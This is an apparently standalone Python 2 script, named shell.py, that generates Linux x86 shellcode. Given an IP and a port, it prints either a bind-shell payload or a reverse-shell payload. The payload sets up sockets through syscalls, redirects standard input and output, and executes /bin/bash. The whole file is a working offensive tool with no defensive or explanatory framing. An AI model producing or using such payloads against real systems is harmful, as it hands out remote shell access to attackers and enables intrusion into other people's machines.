#!/usr/bin/python
import sys
from struct import pack
if len(sys.argv) < 3:
	print "USAGE: shell.py <ip> <port> <type 1-bind 2-reverse>"
	sys.exit()


ip = sys.argv[1]
port = int(sys.argv[2])
type_shell = sys.argv[3]
port = '\\x' + '\\x'.join(x.encode('hex') for x in pack('!H',port ))

ip1 = [hex(int(x)+256)[3:] for x in ip.split('.')]
ip_hex = ''
for i in ip1:
	ip_hex = ip_hex + "\\x" + i

if type_shell == "1":
	bind_shellcode = "\\x31\\xdb\\x31\\xc0\\x31\\xd2\\x31\\xc9\\xb0\\x66\\xb3\\x01\\x57\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x66\\xb3\\x02\\x57\\x66\\x68"+port+"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\xb3\\x04\\x57\\x52\\x89\\xe1\\xcd\\x80\\xb0\\x66\\x43\\x57\\x57\\x52\\x89\\xe1\\xcd\\x80\\x89\\xc2\\xb0\\x3f\\x89\\xd3\\x31\\xc9\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x0b\\x57\\x68\\x62\\x61\\x73\\x68\\x68\\x2f\\x2f\\x2f\\x2f\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
	print bind_shellcode
elif type_shell == "2":
	reverse_shell = "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x57\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc7\\x6a\\x66\\x58\\x43\\x68"+ip_hex+"\\x66\\x68"+port+"\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x43\\xcd\\x80\\x89\\xfb\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\x31\\xc9\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x3f\\x41\\xcd\\x80\\xb0\\x0b\\x56\\x68\\x62\\x61\\x73\\x68\\x68\\x2f\\x2f\\x2f\\x2f\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
	print reverse_shell
else:
	print """ Type either 1 (bind) or 2 (reverse) """ 
